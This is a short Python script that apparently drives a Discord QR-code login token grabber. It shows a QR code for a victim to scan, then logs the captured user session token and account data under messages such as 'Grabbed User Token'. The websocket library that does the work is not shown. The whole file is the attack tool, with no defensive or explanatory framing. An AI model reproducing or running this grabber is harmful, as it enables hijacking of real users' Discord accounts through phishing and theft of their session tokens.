from lib.discord_websocket import DiscordWebsocket
import logging
import coloredlogs

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)
coloredlogs.install(level='INFO', logger=logger, fmt='%(asctime)s %(name)s %(levelname)s %(message)s')
logger.info("Logger initialized with colored output")

def on_qr_code(qr_code):
    qr_code.show()

def on_user_token(token, user):
    logger.info(f"Grabbed User Token: {token}")
    logger.info(f"Grabbed User Data: {user.__dict__}")

def on_user_data(user):
    logger.info(f"Grabbed User Data: {user.__dict__}")

ws = DiscordWebsocket(on_qr_code=on_qr_code, on_user_token=on_user_token, on_user_data=on_user_data)
ws.run()

logger.info("Exited! Bye!")